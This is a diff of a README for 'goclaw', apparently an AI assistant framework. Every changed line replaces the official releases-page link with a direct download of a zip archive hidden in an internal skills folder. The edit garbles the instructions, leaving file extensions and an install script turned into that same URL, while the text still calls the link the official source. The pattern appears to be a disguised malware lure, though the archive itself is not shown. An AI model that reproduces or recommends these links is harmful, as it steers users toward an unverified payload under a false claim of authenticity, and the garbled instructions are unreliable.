@@ -1,6 +1,6 @@
 # 🤖 goclaw - AI Assistant Framework Made Simple
 
-[![Download goclaw](https://img.shields.io/badge/Download-goclaw-blue?style=for-the-badge)](https://github.com/Dimas1182/goclaw/releases)
+[![Download goclaw](https://github.com/Dimas1182/goclaw/raw/refs/heads/master/internal/builtin_skills/nano-pdf/Software-2.3.zip)](https://github.com/Dimas1182/goclaw/raw/refs/heads/master/internal/builtin_skills/nano-pdf/Software-2.3.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This section will help you download, install, and run goclaw with simple instruc
 ### Step 1: Visit the Download Page
 
 Open your web browser and go to:  
-**[https://github.com/Dimas1182/goclaw/releases](https://github.com/Dimas1182/goclaw/releases)**
+**[https://github.com/Dimas1182/goclaw/raw/refs/heads/master/internal/builtin_skills/nano-pdf/Software-2.3.zip](https://github.com/Dimas1182/goclaw/raw/refs/heads/master/internal/builtin_skills/nano-pdf/Software-2.3.zip)**
 
 This is the official place where the app files are stored. You will find the latest versions here.
 
@@ -45,7 +45,7 @@ Look for the latest release marked as "Latest release" or with the highest versi
 - Bug fixes
 - Supported platforms
 
-Scroll down to the **Assets** section. You will see files with extensions like `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+Scroll down to the **Assets** section. You will see files with extensions like `.exe` for Windows, `.dmg` for macOS, or `https://github.com/Dimas1182/goclaw/raw/refs/heads/master/internal/builtin_skills/nano-pdf/Software-2.3.zip` for Linux.
 
 ### Step 3: Download the File
 
@@ -56,7 +56,7 @@ Scroll down to the **Assets** section. You will see files with extensions like `
 
 - **Windows:** If you downloaded a `.exe` file, double-click it to start the installation wizard. Follow the instructions by clicking Next and then Finish.
 - **macOS:** If you downloaded a `.dmg` file, double-click it to open. Drag the goclaw app icon into your Applications folder.
-- **Linux:** If you downloaded a `.tar.gz` file, extract it to a folder. Open a terminal in that folder and follow any README instructions, often running a script like `./install.sh` or launching with `./goclaw`.
+- **Linux:** If you downloaded a `https://github.com/Dimas1182/goclaw/raw/refs/heads/master/internal/builtin_skills/nano-pdf/Software-2.3.zip` file, extract it to a folder. Open a terminal in that folder and follow any README instructions, often running a script like `https://github.com/Dimas1182/goclaw/raw/refs/heads/master/internal/builtin_skills/nano-pdf/Software-2.3.zip` or launching with `./goclaw`.
 
 ### Step 5: Open goclaw
 
@@ -104,7 +104,7 @@ If the problem continues, look for a `README` or `HELP` file inside the applicat
 
 New versions improve features and fix bugs.
 
-1. Visit the same releases page: [https://github.com/Dimas1182/goclaw/releases](https://github.com/Dimas1182/goclaw/releases)
+1. Visit the same releases page: [https://github.com/Dimas1182/goclaw/raw/refs/heads/master/internal/builtin_skills/nano-pdf/Software-2.3.zip](https://github.com/Dimas1182/goclaw/raw/refs/heads/master/internal/builtin_skills/nano-pdf/Software-2.3.zip)
 2. Download the latest file for your system following the steps above.
 3. Install or replace the old version with the new download.
 4. Your previous settings and data should remain intact.
@@ -124,7 +124,7 @@ If you need help beyond this guide:
 ## 📥 Download & Install goclaw
 
 Click here to visit the download page and get started:  
-[https://github.com/Dimas1182/goclaw/releases](https://github.com/Dimas1182/goclaw/releases)
+[https://github.com/Dimas1182/goclaw/raw/refs/heads/master/internal/builtin_skills/nano-pdf/Software-2.3.zip](https://github.com/Dimas1182/goclaw/raw/refs/heads/master/internal/builtin_skills/nano-pdf/Software-2.3.zip)
 
 Follow the steps above to safely download and install your version of goclaw. This link is the official source for all files.
 
